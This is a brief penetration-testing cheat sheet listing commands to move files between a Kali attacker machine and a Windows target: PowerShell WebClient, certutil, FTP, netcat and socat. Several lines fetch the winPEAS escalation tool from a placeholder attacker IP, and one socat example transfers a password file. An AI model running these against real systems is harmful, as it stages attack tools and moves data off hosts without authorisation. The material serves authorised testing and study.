# File transfer 


```powershell
# File download using powershell
[Kali] python3 -m http.server 8888
[Windows] powershell -c "(New-Object System.Net.WebClient).DownloadFile(\"http://<attacker_ip>:8888/winPEASany.exe\", \"winpeas.exe\")" 
```

```bash
# File download using certutil
[Kali] python3 -m http.server 8888
[Windows] certutil -urlcache -split -f "http://<attacker_ip>:8888/winPEASany.exe" winpeas.exe
```

```bash
# File transfer using FTP
[Kali] python -m pyftpdlib -p 21  
[Windows] ftp -A <attacker_ip>   
binary    
get winPEAS.exe   
bye 
```

```bash
# File copy using netcat
[Windows] nc -nlvp 4444 > incoming.exe
[Kali] nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe 
```

```bash
# Socat to set up listen to transfer file
[Kali] sudo socat TCP-LISTEN:443,fork file:sample_file.txt
[Windows] socat TCP:<listener_address>:443 file:received_secret_passwords.txt,create
```

